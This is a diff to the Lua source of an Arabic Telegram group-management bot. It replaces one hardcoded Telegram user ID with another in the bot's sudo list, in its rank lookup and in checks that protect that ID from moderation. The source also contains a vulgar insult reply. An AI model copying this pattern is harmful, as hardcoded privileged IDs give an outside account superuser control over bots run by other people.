@@ -127,7 +127,7 @@ IrAq Source
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,742655070,1966023422} or {Config.sudo_users,742655070,1966023422}
+SudoIds = {Config.SudoIds,2090134520} or {Config.sudo_users,742655070,2090134520}
 IrAq = Config.IrAq or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (DevAli:get(IrAq..'Ali:NameBot') or 'عراق')
@@ -593,7 +593,7 @@ end ,nil)
 end
 --     Source IrAq     --
 local AliRank = function(msg) if SudoId(msg.sender_user_id_) then IrAqTEAM  = "المطور" elseif SecondSudo(msg) then IrAqTEAM = "المطور" elseif SudoBot(msg) then IrAqTEAM = "المطور" elseif ManagerAll(msg) then IrAqTEAM = "المدير" elseif AdminAll(msg) then IrAqTEAM = "الادمن" elseif AliConstructor(msg) then IrAqTEAM = "المالك" elseif BasicConstructor(msg) then IrAqTEAM = "المنشئ" elseif Constructor(msg) then IrAqTEAM = "المنشئ" elseif Manager(msg) then IrAqTEAM = "المدير" elseif Admin(msg) then IrAqTEAM = "الادمن" else IrAqTEAM = "العضو" end return IrAqTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1966023422) then IrAqTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(IrAq) then IrAqTEAM = 'البوت' elseif SudoId(user_id) then IrAqTEAM = 'المطور الاساسي' elseif DevAli:sismember(IrAq..'Ali:SecondSudo:', user_id) then IrAqTEAM = 'المطور الثانوي' elseif DevAli:sismember(IrAq..'Ali:SudoBot:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAli:sismember(IrAq..'Ali:ManagerAll:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAli:sismember(IrAq..'Ali:AdminAll:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAli:sismember(IrAq..'Ali:VipAll:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAli:sismember(IrAq..'Ali:AliConstructor:'..chat_id, user_id) then IrAqTEAM = 'المالك' elseif DevAli:sismember(IrAq..'Ali:BasicConstructor:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAli:sismember(IrAq..'Ali:Constructor:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAli:sismember(IrAq..'Ali:Managers:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Managers:Rd"..chat_id) or 'المدير' elseif DevAli:sismember(IrAq..'Ali:Admins:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Admins:Rd"..chat_id) or 'الادمن' elseif DevAli:sismember(IrAq..'Ali:VipMem:'..chat_id, user_id) then  IrAqTEAM = DevAli:get(IrAq.."Ali:VipMem:Rd"..chat_id) or 'المميز' elseif DevAli:sismember(IrAq..'Ali:Cleaner:'..chat_id, user_id) then  IrAqTEAM = DevAli:get(IrAq.."Ali:Cleaner:Rd"..chat_id) or 'المنظف' else IrAqTEAM = DevAli:get(IrAq.."Ali:mem:Rd"..chat_id) or 'العضو' end return IrAqTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(2090134520) then IrAqTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(IrAq) then IrAqTEAM = 'البوت' elseif SudoId(user_id) then IrAqTEAM = 'المطور الاساسي' elseif DevAli:sismember(IrAq..'Ali:SecondSudo:', user_id) then IrAqTEAM = 'المطور الثانوي' elseif DevAli:sismember(IrAq..'Ali:SudoBot:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAli:sismember(IrAq..'Ali:ManagerAll:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAli:sismember(IrAq..'Ali:AdminAll:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAli:sismember(IrAq..'Ali:VipAll:', user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAli:sismember(IrAq..'Ali:AliConstructor:'..chat_id, user_id) then IrAqTEAM = 'المالك' elseif DevAli:sismember(IrAq..'Ali:BasicConstructor:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAli:sismember(IrAq..'Ali:Constructor:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAli:sismember(IrAq..'Ali:Managers:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Managers:Rd"..chat_id) or 'المدير' elseif DevAli:sismember(IrAq..'Ali:Admins:'..chat_id, user_id) then IrAqTEAM = DevAli:get(IrAq.."Ali:Admins:Rd"..chat_id) or 'الادمن' elseif DevAli:sismember(IrAq..'Ali:VipMem:'..chat_id, user_id) then  IrAqTEAM = DevAli:get(IrAq.."Ali:VipMem:Rd"..chat_id) or 'المميز' elseif DevAli:sismember(IrAq..'Ali:Cleaner:'..chat_id, user_id) then  IrAqTEAM = DevAli:get(IrAq.."Ali:Cleaner:Rd"..chat_id) or 'المنظف' else IrAqTEAM = DevAli:get(IrAq.."Ali:mem:Rd"..chat_id) or 'العضو' end return IrAqTEAM end
 --     Source IrAq     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4432,7 +4432,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(1966023422) then 
+if tonumber(result.id_) == tonumber(2090134520) then 
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4463,7 +4463,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(1966023422) then  
+if tonumber(result.sender_user_id_) == tonumber(2090134520) then  
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
